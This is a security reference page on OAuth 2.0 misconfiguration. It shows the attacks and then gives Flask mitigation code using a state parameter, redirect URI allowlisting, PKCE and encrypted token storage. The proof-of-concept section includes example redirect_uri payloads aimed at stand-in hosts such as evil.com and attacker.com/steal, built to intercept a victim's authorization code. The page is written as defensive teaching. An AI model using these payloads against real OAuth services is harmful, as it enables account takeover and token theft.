# OAuth Misconfiguration

## Overview

OAuth 2.0 is a widely-used authorization framework that allows third-party applications to access user resources without exposing credentials. However, implementation flaws can lead to account takeover, token theft, and unauthorized access to user data.

**Severity**: High to Critical  
**OWASP Top 10**: A07:2021 - Identification and Authentication Failures  
**CWE**: CWE-346, CWE-601

## Technical Explanation

Common OAuth vulnerabilities include:
- Missing or weak state parameter validation (CSRF)
- Open redirect vulnerabilities in redirect_uri
- Authorization code interception
- Implicit flow token leakage
- Insufficient scope validation
- Client secret exposure

## Attack Scenario

An attacker exploits a missing state parameter to perform CSRF attacks, linking the victim's account to the attacker's OAuth account.

## Proof of Concept

### 1. Missing State Parameter (CSRF)

```http
# Attacker initiates OAuth flow
GET /oauth/authorize?client_id=APP_ID&redirect_uri=https://app.com/callback&response_type=code HTTP/1.1

# Attacker receives authorization code
https://app.com/callback?code=ATTACKER_CODE

# Attacker sends victim this link (without state)
https://app.com/callback?code=ATTACKER_CODE

# Victim's account now linked to attacker's OAuth account
```

### 2. Redirect URI Manipulation

```http
# Open redirect
GET /oauth/authorize?
  client_id=APP_ID&
  redirect_uri=https://app.com/callback?next=https://evil.com&
  response_type=code

# Path traversal
redirect_uri=https://app.com/../evil.com/callback

# Subdomain takeover
redirect_uri=https://abandoned.app.com/callback
```

### 3. Authorization Code Interception

```http
# Attacker registers app with redirect_uri
redirect_uri=https://attacker.com/steal

# Victim authorizes, code sent to attacker
https://attacker.com/steal?code=VICTIM_CODE

# Attacker exchanges code for access token
POST /oauth/token
code=VICTIM_CODE&client_id=APP_ID&client_secret=SECRET
```

## Impact

- Account Takeover
- Unauthorized Data Access
- Token Theft
- Privacy Violations
- Identity Spoofing

## Mitigation

### 1. Implement State Parameter

```python
from flask import Flask, session, request, redirect
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

@app.route('/oauth/login')
def oauth_login():
    # Generate and store state
    state = secrets.token_urlsafe(32)
    session['oauth_state'] = state
    
    # Build authorization URL
    auth_url = (
        f"https://provider.com/oauth/authorize?"
        f"client_id={CLIENT_ID}&"
        f"redirect_uri={REDIRECT_URI}&"
        f"response_type=code&"
        f"state={state}&"
        f"scope=profile email"
    )
    
    return redirect(auth_url)

@app.route('/oauth/callback')
def oauth_callback():
    # Validate state parameter
    state = request.args.get('state')
    stored_state = session.pop('oauth_state', None)
    
    if not state or state != stored_state:
        return "Invalid state parameter", 400
    
    # Exchange code for token
    code = request.args.get('code')
    token = exchange_code_for_token(code)
    
    return "Success"
```

### 2. Strict Redirect URI Validation

```python
from urllib.parse import urlparse

ALLOWED_REDIRECT_URIS = [
    'https://app.example.com/callback',
    'https://app.example.com/oauth/callback'
]

def validate_redirect_uri(redirect_uri):
    """Strict redirect URI validation"""
    # Must be in allowlist
    if redirect_uri not in ALLOWED_REDIRECT_URIS:
        raise ValueError("Invalid redirect_uri")
    
    # Parse and validate
    parsed = urlparse(redirect_uri)
    
    # Must use HTTPS
    if parsed.scheme != 'https':
        raise ValueError("redirect_uri must use HTTPS")
    
    # Validate domain
    if not parsed.netloc.endswith('example.com'):
        raise ValueError("Invalid domain")
    
    # No fragments
    if parsed.fragment:
        raise ValueError("Fragments not allowed in redirect_uri")
    
    return True

@app.route('/oauth/authorize')
def authorize():
    redirect_uri = request.args.get('redirect_uri')
    
    try:
        validate_redirect_uri(redirect_uri)
    except ValueError as e:
        return str(e), 400
    
    # Continue authorization
    pass
```

### 3. Use PKCE (Proof Key for Code Exchange)

```python
import hashlib
import base64
import secrets

def generate_code_verifier():
    """Generate code verifier for PKCE"""
    return base64.urlsafe_b64encode(secrets.token_bytes(32)).decode('utf-8').rstrip('=')

def generate_code_challenge(verifier):
    """Generate code challenge from verifier"""
    digest = hashlib.sha256(verifier.encode('utf-8')).digest()
    return base64.urlsafe_b64encode(digest).decode('utf-8').rstrip('=')

# Client initiates flow
@app.route('/oauth/login')
def oauth_login_pkce():
    # Generate PKCE parameters
    code_verifier = generate_code_verifier()
    code_challenge = generate_code_challenge(code_verifier)
    
    # Store verifier
    session['code_verifier'] = code_verifier
    
    # Build authorization URL with PKCE
    auth_url = (
        f"https://provider.com/oauth/authorize?"
        f"client_id={CLIENT_ID}&"
        f"redirect_uri={REDIRECT_URI}&"
        f"response_type=code&"
        f"code_challenge={code_challenge}&"
        f"code_challenge_method=S256"
    )
    
    return redirect(auth_url)

# Exchange code with verifier
@app.route('/oauth/callback')
def oauth_callback_pkce():
    code = request.args.get('code')
    code_verifier = session.pop('code_verifier', None)
    
    if not code_verifier:
        return "Missing code verifier", 400
    
    # Exchange code with verifier
    token_response = requests.post('https://provider.com/oauth/token', data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'client_id': CLIENT_ID,
        'code_verifier': code_verifier
    })
    
    return "Success"
```

### 4. Secure Token Storage

```python
from cryptography.fernet import Fernet

# Generate encryption key
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

def store_token(user_id, access_token, refresh_token):
    """Encrypt and store tokens"""
    encrypted_access = cipher.encrypt(access_token.encode())
    encrypted_refresh = cipher.encrypt(refresh_token.encode())
    
    # Store in database
    db.execute("""
        INSERT INTO oauth_tokens (user_id, access_token, refresh_token)
        VALUES (?, ?, ?)
    """, [user_id, encrypted_access, encrypted_refresh])

def retrieve_token(user_id):
    """Retrieve and decrypt tokens"""
    result = db.query("""
        SELECT access_token, refresh_token
        FROM oauth_tokens
        WHERE user_id = ?
    """, [user_id]).fetchone()
    
    if result:
        access_token = cipher.decrypt(result['access_token']).decode()
        refresh_token = cipher.decrypt(result['refresh_token']).decode()
        return access_token, refresh_token
    
    return None, None
```

## Secure Code Example

```python
from flask import Flask, request, session, redirect, jsonify
import secrets
import hashlib
import base64
from urllib.parse import urlparse, urlencode
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# OAuth Configuration
OAUTH_PROVIDER = "https://oauth-provider.com"
CLIENT_ID = "your_client_id"
CLIENT_SECRET = "your_client_secret"
REDIRECT_URI = "https://yourapp.com/oauth/callback"
ALLOWED_REDIRECT_URIS = [REDIRECT_URI]

class OAuthHandler:
    @staticmethod
    def generate_state():
        """Generate secure state parameter"""
        return secrets.token_urlsafe(32)
    
    @staticmethod
    def generate_pkce_pair():
        """Generate PKCE code verifier and challenge"""
        verifier = base64.urlsafe_b64encode(
            secrets.token_bytes(32)
        ).decode('utf-8').rstrip('=')
        
        challenge = base64.urlsafe_b64encode(
            hashlib.sha256(verifier.encode('utf-8')).digest()
        ).decode('utf-8').rstrip('=')
        
        return verifier, challenge
    
    @staticmethod
    def validate_redirect_uri(uri):
        """Strict redirect URI validation"""
        if uri not in ALLOWED_REDIRECT_URIS:
            raise ValueError("Invalid redirect_uri")
        
        parsed = urlparse(uri)
        if parsed.scheme != 'https':
            raise ValueError("HTTPS required")
        
        return True

@app.route('/oauth/login')
def oauth_login():
    """Initiate OAuth flow with security measures"""
    # Generate state for CSRF protection
    state = OAuthHandler.generate_state()
    session['oauth_state'] = state
    
    # Generate PKCE parameters
    verifier, challenge = OAuthHandler.generate_pkce_pair()
    session['code_verifier'] = verifier
    
    # Build authorization URL
    params = {
        'client_id': CLIENT_ID,
        'redirect_uri': REDIRECT_URI,
        'response_type': 'code',
        'state': state,
        'code_challenge': challenge,
        'code_challenge_method': 'S256',
        'scope': 'profile email'
    }
    
    auth_url = f"{OAUTH_PROVIDER}/authorize?{urlencode(params)}"
    return redirect(auth_url)

@app.route('/oauth/callback')
def oauth_callback():
    """Handle OAuth callback with validation"""
    # Validate state parameter
    state = request.args.get('state')
    stored_state = session.pop('oauth_state', None)
    
    if not state or not stored_state or state != stored_state:
        return jsonify({'error': 'Invalid state parameter'}), 400
    
    # Get authorization code
    code = request.args.get('code')
    if not code:
        return jsonify({'error': 'No authorization code'}), 400
    
    # Get code verifier
    code_verifier = session.pop('code_verifier', None)
    if not code_verifier:
        return jsonify({'error': 'Missing code verifier'}), 400
    
    # Exchange code for token
    try:
        token_data = exchange_code_for_token(code, code_verifier)
        
        # Validate token
        user_info = validate_and_get_user_info(token_data['access_token'])
        
        # Create session
        session['user_id'] = user_info['id']
        session['access_token'] = token_data['access_token']
        
        return redirect('/dashboard')
        
    except Exception as e:
        return jsonify({'error': 'Token exchange failed'}), 500

def exchange_code_for_token(code, code_verifier):
    """Exchange authorization code for access token"""
    response = requests.post(
        f"{OAUTH_PROVIDER}/token",
        data={
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI,
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'code_verifier': code_verifier
        },
        headers={'Accept': 'application/json'},
        timeout=10
    )
    
    if response.status_code != 200:
        raise ValueError("Token exchange failed")
    
    return response.json()

def validate_and_get_user_info(access_token):
    """Validate token and get user information"""
    response = requests.get(
        f"{OAUTH_PROVIDER}/userinfo",
        headers={'Authorization': f'Bearer {access_token}'},
        timeout=10
    )
    
    if response.status_code != 200:
        raise ValueError("Invalid access token")
    
    return response.json()

if __name__ == '__main__':
    app.run(ssl_context='adhoc')
```

## Security Takeaways

1. Always implement state parameter for CSRF protection
2. Use PKCE for all OAuth flows
3. Strictly validate redirect URIs with allowlists
4. Never expose client secrets in client-side code
5. Use authorization code flow, avoid implicit flow
6. Implement short-lived access tokens
7. Encrypt tokens at rest
8. Validate token signatures
9. Implement proper scope validation
10. Use HTTPS for all OAuth endpoints

## References

- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)
- [RFC 7636: PKCE](https://datatracker.ietf.org/doc/html/rfc7636)
